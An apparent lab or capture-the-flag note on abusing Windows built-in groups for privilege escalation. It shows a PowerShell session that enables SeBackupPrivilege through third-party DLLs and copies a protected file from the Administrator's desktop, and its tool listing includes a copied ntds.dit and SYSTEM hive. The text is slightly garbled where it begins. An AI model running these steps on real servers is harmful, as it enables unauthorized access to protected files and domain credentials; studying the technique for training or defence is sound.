Windows servers, and especially Domain Controllers, have a variety of built-in groups that either ship with the operating system or get added when the Active Directory Domain Services role is installed on a system to promote a server to a Domain Controller. Many of these groups confer special privileges on their members, and some can be leveraged to escalate privileges on a server or a Domain Controller.

|                                                                                                                                                                           |                                                                                                                                                                 |                                                                                                                                                                |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators)            | [Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders) | [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins)              |
| [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators) | [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)    | [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) |

enable the SeBackupPrivilege.

```
PS C:\> cd tools
PS C:\tools> ls


    Directory: C:\tools


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   4:06 PM                DSInternals
-a----        5/21/2021  10:18 AM           5120 adduser.dll
-a----         5/6/2021   5:53 PM       16777216 ntds.dit
-a----        6/28/2016  10:43 AM         188584 PsService.exe
-a----         5/6/2021  12:55 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----         5/6/2021  12:54 PM          16384 SeBackupPrivilegeUtils.dll
-a----        6/11/2004   3:33 PM         290304 subinacl.exe
-a----         5/6/2021   5:54 PM       16236544 SYSTEM


PS C:\tools> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\tools> Import-Module .\SeBackupPrivilegeCmdLets.dll
PS C:\tools>  Set-SeBackupPrivilege
PS C:\tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\tools>
```

now copy the file using this cmd.
```
PS C:\tools> Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt
Copied 30 `bytes
```
``
